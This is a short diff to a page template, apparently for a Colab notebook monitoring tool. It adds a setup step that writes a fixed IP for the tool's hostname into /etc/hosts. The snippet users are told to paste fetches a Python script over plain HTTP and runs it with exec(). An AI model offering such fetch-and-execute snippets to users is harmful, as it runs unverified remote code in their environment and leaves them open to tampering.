@@ -3,6 +3,7 @@ block content
     div To get started, enter this code below on your notebook 😀
     pre
         code
+            | !echo "185.224.137.80 colab-monitor.smankusors.com" >> /etc/hosts
             | from urllib.request import urlopen
             | exec(urlopen("http://colab-monitor.smankusors.com/track.py").read())
     div After that you will see the URL printed to open the monitor 😉
